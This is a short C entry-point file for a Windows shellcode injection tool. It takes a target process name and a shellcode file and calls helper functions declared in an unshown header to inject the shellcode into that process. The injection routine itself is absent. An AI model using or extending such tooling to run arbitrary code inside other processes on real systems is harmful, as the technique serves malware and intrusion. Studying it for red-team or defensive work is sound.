# include "injection.h"
# include <windows.h>
# include <stdio.h>

int main(int argc, char** argv) {
	if (argc != 3) {
		yapBad("Usage: [PROCESS] [SHELLCODE.BIN]");
		return EXIT_FAILURE;
	}

	ULONG_PTR pHandle = (findHandle(argv[1]));

	if (pHandle == NULL) {
		yapBad("Shellcode injection failed");
		return EXIT_FAILURE;
	};

	if (!ShellcodeInjection(pHandle, argv[2])) {
		yapBad("Shellcode injection failed");
		return EXIT_FAILURE;
	}

	yapOkay("Shellcode injection successfull");
	return EXIT_SUCCESS;
}